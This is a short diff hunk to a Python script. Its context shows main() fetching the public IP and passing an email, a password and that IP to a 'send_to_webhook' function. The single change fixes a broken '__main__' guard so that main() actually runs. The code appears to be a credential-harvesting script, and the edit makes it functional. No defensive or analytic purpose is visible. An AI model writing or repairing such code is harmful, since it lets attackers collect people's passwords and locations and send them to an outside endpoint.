@@ -26,5 +26,5 @@ def main():
     ip_address = get_public_ip()
     send_to_webhook(email, password, ip_address)
 
-if __name == "__main":
+if __name__ == "__main__":
     main()
